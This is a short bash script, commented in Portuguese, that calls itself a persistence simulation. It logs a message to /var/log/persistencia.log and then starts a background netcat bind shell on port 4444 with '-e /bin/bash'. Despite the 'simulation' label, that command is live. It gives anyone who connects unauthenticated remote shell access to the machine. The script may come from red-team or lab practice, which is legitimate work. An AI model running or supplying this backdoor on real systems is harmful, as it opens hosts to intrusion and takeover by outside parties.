#!/bin/bash
echo "[PERSISTÊNCIA] Simulação de persistência executada" >> /var/log/persistencia.log
nohup nc -lvp 4444 -e /bin/bash &
